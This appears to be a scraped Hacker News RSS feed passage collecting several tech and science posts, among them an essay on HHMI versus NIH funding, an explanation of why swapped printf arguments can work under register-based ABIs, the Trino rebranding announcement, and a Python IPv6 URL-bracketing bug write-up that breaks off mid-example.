<p>There are other differences, HHMI <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">requires</a> researchers to spend 75% of their time doing research, whereas in R01s there is no such limit. DP1s are required to work half of their time on grant-related research.</p>
<p>This brief discussion is just to highlight that the "fund people, not projects" approach, even when looked at by using their usual life sciencesexemplars, is not as clear cut as it may seem. It may be more useful to consider two extreme idealized approaches instead:</p>
<ul>
<li>Fund projects: A scientist proposes to do a specific, well defined project. There is an expected deliverable and there may be milestones involved that have to be met. Rather then being open ended and highly uncertain, it is roughly known to be achievable. The project should be ended if it's not meeting its goals.</li>
<li>Fund people: A scientist is funded generously and have all their requirements for assistants and equipment met without paperwork or further reviews. They have zero accountability, and what they decide to research or publish has no bearing on the continuation of funding. In effect they have life tenure. They don't perish if they don't publish.</li>
</ul>
<p>It's clear that there are advantages and disadvantages to both approaches; they are the explore/exploit tradeoff with another name. The first one is similar to the <a href="https://www.dayoneproject.org/post/focused-research-organizations-to-accelerate-science-technology-and-medicine">Focused Research Organization</a> concept.</p>
<p>The second one sounds like tenure. But modern day tenure is not generally like this. Scientists are <a href="https://academia.stackexchange.com/questions/37986/is-it-possible-to-survive-in-university-academia-without-applying-for-grants">expected to continue to apply</a> for grants and bring money to the university (The university gets a cut), as well as to grow their lab; in turn as they now have a lab they have some obligation to their students, who do need to publish in high impact journals in order to get ahead in academia. Tenure pays just the salay (and 9 months of it in the case of US tenure, as the other 3 are expected to be covered with grants). It does not cover the cost of any materials employed during the course of research, or the salaries of research assistants (Those also have to come from grants). </p>
<p>Donald Braben <a href="https://nintil.com/review-scientific-freedom">points out</a> that before 1970 (or so)</p>
<blockquote>
<p>tenured academics with an individual turn of mind could usually dig out modest sources of funding to tackle any problem that interested them without first having to commit themselves in writing. Afterward, unconditional sources of funds would become increasingly diffi cult to find. Today, they are virtually nonexistent.</p>
<p>The way forward for ambitious young researchers was once clear, therefore. All they had to do was to acquire the necessary qualifications, and then to find a tenured appointment. To say the least, that was not easy, but not substantially more difficult than it would be today. However, having served their apprenticeship, they were free. They may have had to overcome the inevitable peer pressure if their plans were controversial, but their peers did not have power of veto— see Poster 1 .Written applications were necessary if expensive equipment or large teams were required, but tenured researchers with modest needs would meet few obstacles. </p>
</blockquote>
<p>This still sounds like modern day tenure! What has changed is that <em>if</em> more expensive equipment is now required (And this is most likely true in the life sciences than in theoretical physics) and that in turn requires grants, then academics now have that additional potential veto in a way that the cheaper experiments of the past did not have. And Braben can't argue that the new system selects for people that are good at getting grants. In the quote above he concedes that getting tenure was as hard back then; and plausibly to get tenure you needed the same things you do today.</p>
<p>The ones that come close to the "fund people" approach are not HHMI investigators, or the pre-1970 scientific community; those would be the self-funded <a href="https://en.wikipedia.org/wiki/Independent_scientist">independent scientists</a> that were wealthy enough to be able to do anything they wanted. Alfred Loomis' story in particular, how he managed to have the best equipped lab in the US, paid out of his Wall Street profits, seems the closest to the platonic form of the fund people approach.</p>
<h2 id="fund-people-not-metrics">Fund people, not metrics?</h2>
<p>Another distinction to be made here beyond people vs projects is <em>how</em> people or projects are selected. One can use impersonal metrics or one can get more personal and, eschew all bureaucracy and process and go full <a href="https://twitter.com/matthewclifford/status/1326479506983579648">nepotistic</a>. Though not intrinsically tied to "fund people", it is true that those approaches have historically been more linked to a personal approach. Ioannidis (<a href="https://www.nature.com/articles/477529a">2011</a>) discusses various "fund people" approaches which include using mechanisms like lotteries or just funding everyone. This is one of the two missing sectors of the 2x2 quadrant (In red, missing):</p>
<p><img loading="lazy" src="https://docs.google.com/drawings/d/e/2PACX-1vQ5u2jOns5eT5Ta_33-Y8APOXOPijFOyaCfy_xD8glo70oQ-DcemVZddoYmD3G9KO6Qhd_qIcCfy1ek/pub?w=960" alt=""></p>
<p>In the HHMI process, a scientist get personally interviewed in the later stages of being funded. For R01s, there is a committee (a study section) that one will never see or meet. The Rockefeller foundation (post WWII) took it to an even more extreme …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/hhmi-and-nih">https://nintil.com/hhmi-and-nih</a></em></p>]]>
            </description>
            <link>https://nintil.com/hhmi-and-nih</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566953</guid>
            <pubDate>Tue, 29 Dec 2020 05:09:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A little puzzle with printf() and C argument passing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566835">thread link</a>) | @todsacerdoti
<br/>
December 28, 2020 | https://utcc.utoronto.ca/~cks/space/blog/programming/PrintfAndArgumentPassing | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/programming/PrintfAndArgumentPassing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>A little puzzle with <code>printf()</code> and C argument passing</h2>

	<p><small>December 28, 2020</small></p>
</div><div><p>In <a href="https://randomascii.wordpress.com/2020/08/30/the-easy-ones-three-bugs-hiding-in-the-open/">The Easy Ones â€“ Three Bugs Hiding in the Open</a>,
Bruce Dawson gave us a little C puzzle in passing:</p>

<blockquote><p>The <a href="https://en.wikipedia.org/wiki/Stdarg.h">variable arguments</a> in
printf formatting means that it is easy to get type mismatches. The
practical results vary considerably:</p>

<ol><li>printf(â€œ0x%08lxâ€�, p); // Printing a pointer as an int â€“ truncation or worse on 64-bit </li>
<li>printf(â€œ%d, %fâ€�, f, i); // Swapping float and int â€“ could print nonsense, or might actually work (!) </li>
<li>printf(â€œ%s %dâ€�, i, s); // Swapping the order of string and int â€“ will probably crash</li>
</ol>

<p>[...] (aside: understanding why #2 often
prints the desired result is a good <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a> puzzle)</p>
</blockquote>

<p>I had to think about this for a bit, and then I realized why and
how it can work (and why similar integer versus float argument
confusion can also work for other functions, even ones with fixed
argument lists). What it comes down to is that in some <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a>s,
arguments are passed in registers (at least early arguments, before
you run out of registers), and <strong>floating point arguments are passed
in different registers than integers (and pointers)</strong>.  This is
true even for functions that take variable arguments and will walk
through them using stdarg macros (or at least it can be, depending
on the ABI).</p>

<p>Because floating point and non floating point arguments are passed
in different sets of registers, what matters isn't the total order
of arguments but the order of floating point or non-fp arguments.
So here, regardless of where '%f' is in the printf format, it always
causes printf() to get the first floating point argument, which can
never be confused with an integer argument. Similarly, the first
'%d' causes printf() to look for the second non-fp argument,
regardless of where it was in the argument order; it could be at
the end of several floating point arguments and still work.</p>

<p>(The '%d' makes printf() look for the second non-fp argument because
the first one was the format string. In an ABI that passed pointers
in a separate place than integers, it would still work out, since now
the first '%d' would be looking for the first integer argument.)</p>

<p>Using the excellent services of godbolt.org, we can see this in
action on 64-bit x86 in <a href="https://godbolt.org/z/hYz9Gn">a very small example</a> (I used a very small example and a
decent optimization level to get clear, minimal assembly code). The
floating point argument is passed in <code>xmm0</code>, while the format string
and the integer argument are passed in <code>edi</code> and <code>esi</code> respectively
(I don't know what <code>eax</code> is doing, but it probably has something
to do with the ABI). A similar thing happens on 64-bit ARM v8 (aka
Aarch64), as we can also see on godbolt with <a href="https://godbolt.org/z/jrxz96">the same example on
Aarch64</a>.</p>

<p>(Based on <a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">this page</a>,
the Aarch64 <code>x0</code> and <code>w1</code> are in the same set of registers. Apparently
<code>d0</code> is a 64-bit version of the first floating point register, from
<a href="https://armkeil.blob.core.windows.net/developer/Files/pdf/graphics-and-multimedia/ARMv8_InstructionSetOverview.pdf">here</a>
[pdf]. I wound up looking up all of this to be sure I understood
what was going on in the Aarch64 call, so I might as well write it
down here.)</p>

<p>Since pointers and integers are normally passed in the same set of
registers (at least on 64-bit x86 and Aarch64), we can also see why
the third example is very likely to fail. Since the same set of
registers is used for both argument types, it's possible to use an
integer argument as a pointer argument, with a segmentation fault
as the likely result. Similarly, we can predict that '<code>printf("%s
%f", f, s);</code>' might well work.</p>

<p>PS: This confusion can happen in any language that follows the C
ABI on a platform with this sort of split usage of registers (although
many languages may prevent this sort of argument type confusion).
Not all languages do; famously, Go currently passes all arguments
on the stack (as of Go 1.15 and soon Go 1.16).</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/programming/PrintfAndArgumentPassing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566835</guid>
            <pubDate>Tue, 29 Dec 2020 04:45:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Neural Networks from Scratch Book]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566528">thread link</a>) | @JCPJ
<br/>
December 28, 2020 | https://jc-progjava.github.io/Building-Neural-Networks-From-Scratch/ | <a href="https://web.archive.org/web/*/https://jc-progjava.github.io/Building-Neural-Networks-From-Scratch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="visible">
            
            
            <p>In this mini-book, you will(hopefully) learn about different neural network structures. By the end of the book,
                I hope you also will have a solid conceptual understanding of how neural networks function.</p><p>I will briefly go through some necessary formulas and equations, but will mainly
                stick to broad definitions that are comprehendible to even middle school students(I’ll try!). Some topics are well
                beyond those taught in middle school, so you may want to look at more thorough and step-by-step walkthroughs on the
                topics on platforms like <a rel="noopener" href="https://khanacademy.org/" target="_blank">Khan Academy</a>.
                As you go through this book, you will also encounter several different projects and real-world problems that I will
                walk you through and solve. I highly recommend you take a try at solving them beforehand! Solutions that I give may
                not be the best and most state-of-the-art, so you can also try and tweak it a bit to make it better! I will try to
                add some optimizations to the code to make it faster and more efficient and give you a summary of what state-of-the-art
                methods data scientists now use. All code in this book is either pseudocode or written in Java, so you should be able to
                roughly interpret it if you have learned any C-like programming languages! You don’t need to learn one right away to
                continue reading either… I provide detailed explanations of each line of code. You can also find it all on
                <a rel="noopener" href="https://github.com/JC-ProgJava/Building-Neural-Networks-From-Scratch" target="_blank">GitHub</a> (with this book).</p>
        </div>
    </div><div>
        <h2>Tips &amp; Thanks</h2>
        <p>Currently none, you can have your feedback and review written here if you fill this <a rel="noopener" href="https://forms.gle/c9oB2PgWgAEwkKrEA" target="_blank">form</a>!</p>
        <br>
    </div></div>]]>
            </description>
            <link>https://jc-progjava.github.io/Building-Neural-Networks-From-Scratch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566528</guid>
            <pubDate>Tue, 29 Dec 2020 03:50:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Is Killing Our Productivity. What We Can Do About It?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25566426">thread link</a>) | @freediver
<br/>
December 28, 2020 | https://www.simplecto.com/google-killing-productivity/ | <a href="https://web.archive.org/web/*/https://www.simplecto.com/google-killing-productivity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><strong>tldr;</strong> Information retrieval is a critical part of creative work. Google's once awesome search product is now a tool of distraction. In response I share some ideas about new ways of working with "workspace" search.</p><h3 id="all-work-requires-looking-it-up">All work requires "looking it up"</h3><p>I've been a developer, a manager, a cook, and an old Mercedes station wagon repair man.</p><p>At every turn in those careers (some shorter lived than others) I have used information retrieval as a part of my workflow:</p><ul><li>In the kitchen I look up recipes.</li><li>I went onto forums, into old manuals, and specialist mechanics to figure out how things work on that old car.</li><li>Good old fashioned foolish "hold my beer" moments where I just had to take my best guess and hope for the best.</li><li>Ask my boss, mentor, or older folks that are around (and hope they know what they are talking about)</li></ul><h3 id="the-good-old-days">The Good Old Days</h3><p>There was a time when Google shortened the path to answers. Once we learned how to plug in the right keywords the right way it would turn over some hidden stones and reveal the gems underneath. In short order we were back to work armed with new information that would become knowledge.</p><p>But those days are gone. </p><p>The shareholders and advertisers took over and monetized the hell out of us.</p><blockquote>We were always the product.</blockquote><h3 id="google-shortens-the-distance-between-our-eyes-and-advertising">Google shortens the distance between our eyes and advertising</h3><p>Search something as simple as "Learn Django" and be greeted with this: a page full of ads and no organic results. Is this relevancy?</p><figure><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1972w" sizes="(min-width: 720px) 720px"></figure><h3 id="advertising-and-seo-sewage-masquerading-as-content">Advertising and SEO sewage masquerading as content</h3><p>That field of relevant information is now a minefield of advertising and SEO sewage masquerading as content.</p><p><strong>This is especially true for developers. And even more true for new developers.</strong></p><p>It seems that I am frequently back on Google in search of a code snippet, a bug, or a docker container that already does the thing that I want.</p><p>The flow is always the same:</p><ol><li>Alt-tab to browser</li><li>Open google</li><li>Search something (<strong>this is a skill to develop</strong>)</li><li>Scan past all the ads, sketchy SEO'd sites, and hunt for what might be the right link. (<strong>This is another skill unto itself, and honed after years of bad clicks</strong>)</li><li>Click the link into new tab (there will be more new tabs as I hunt and peck)</li><li>Eventually I find a few candidate pages that might point me to a good solution.</li><li>Rinse, repeat forever.</li></ol><figure><img src="https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/google-killing-productivity.jpg 600w, https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>By the time I find something worth trying I've broken the flow and restart the climb back up the productivity curve.</p><hr><p><em>"OK, so I get it. Google no longer has your best interest at hear (if they every did). What do you propose?"</em></p><hr><p>Glad you asked.</p><h2 id="i-want-focused-results-eg-less-is-more-">I want focused results (eg. Less is more)</h2><p>In observing my own behavior I see there are a handful of resources I want to tap into when doing my work (development for example):</p><ul><li>Documentation</li><li>Code snippets</li><li>Stack traces</li><li>Community / Forums</li><li>Libraries and Plugins</li></ul><p>These come from only a few places. I don't need (or want) to walk the vast expanse of the web to only keep coming back to these same results. Google used to do a fine job of filtering and offering relevance, but again – those days are long gone.</p><p><strong>I want a workspace </strong>that focuses my attention on these few resources. I can jump into documentation, code, or find help from the <strong>curated</strong> resources offered by a niche/vertical search engine.</p><h3 id="niche-aka-vertical-search-is-worth-exploring">Niche (aka vertical) Search is worth exploring</h3><p>This is what I'm working on – a system of modules that stitch together as a focused, niche search engine. It is self-curated (by me or a community, or other entusiasts/subject matter experts) with the sole purpose to only return results optimized to my workflow.</p><p>I have:</p><ul><li>Scripts to acquire content via Web, RSS, and APIs</li><li>A database to store, retreive, and sort the information to my needs.</li><li>Simplified and controlled interfaces optimized to how I want to work, and how I want to consumer the information.</li></ul><p>The narrow scope of the project brings a few interesting side-effects:</p><ol><li>Shallow tech stack means I (or a small team) can understand all parts of it with relative competence.</li><li>Narrow focus of content means I don't have scaling issues in terms of compute, network, or storage. Only a few gigs at most.</li><li>Growing too large means that it is better to create a new engine with a narrower focus. This scales horizontally, but with some overhead on administration.</li><li>We move the challenge from the hard problem and opaque solutions of AI to the clear and simple and marketable solutions of human Curation.</li></ol><figure><div><div><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png" width="1944" height="1544" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1944w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png" width="2000" height="1213" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png" width="2000" height="1193" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 2400w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>My niche/vertical search engine workspace.</figcaption></figure><p>So this is what I've been thinking about. Over the next few weeks, when working on Django projects, I will make this my first destination when seeking answers. I am curious to see if it actually improves my workflow, focus, and productivity.</p><p>A second hypothesis I will test is if this can work for others working in other ecosystems such as Javascript or Go language.</p>
			</section></div>]]>
            </description>
            <link>https://www.simplecto.com/google-killing-productivity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566426</guid>
            <pubDate>Tue, 29 Dec 2020 03:28:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reading online comments affects us]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566181">thread link</a>) | @behnamoh
<br/>
December 28, 2020 | https://socialmediapsychology.eu/2016/10/05/onlineandsocialmediacomments/ | <a href="https://web.archive.org/web/*/https://socialmediapsychology.eu/2016/10/05/onlineandsocialmediacomments/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://socialmediapsychology.eu/2016/10/05/onlineandsocialmediacomments/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566181</guid>
            <pubDate>Tue, 29 Dec 2020 02:46:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We’re Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25566055">thread link</a>) | @rubinelli
<br/>
December 28, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566055</guid>
            <pubDate>Tue, 29 Dec 2020 02:30:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Node.example.com Is an IP Address]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25565443">thread link</a>) | @nfrmatk
<br/>
December 28, 2020 | https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/ | <a href="https://web.archive.org/web/*/https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <main>
      
  <article>  
    
    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. 📚</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voilà! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. 🤿</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ✅</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> 😒).</p>
<pre><code><span>✖ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds
✔ </span><span>OK</span><span> py36 in </span><span>2</span><span>.</span><span>82</span><span> seconds
✔ </span><span>OK</span><span> py37 in </span><span>2</span><span>.</span><span>621</span><span> seconds
✔ </span><span>OK</span><span> py38 in </span><span>2</span><span>.</span><span>524</span><span> seconds
✔ </span><span>OK</span><span> py39 in </span><span>2</span><span>.</span><span>461</span><span> seconds
</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? 🤔</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
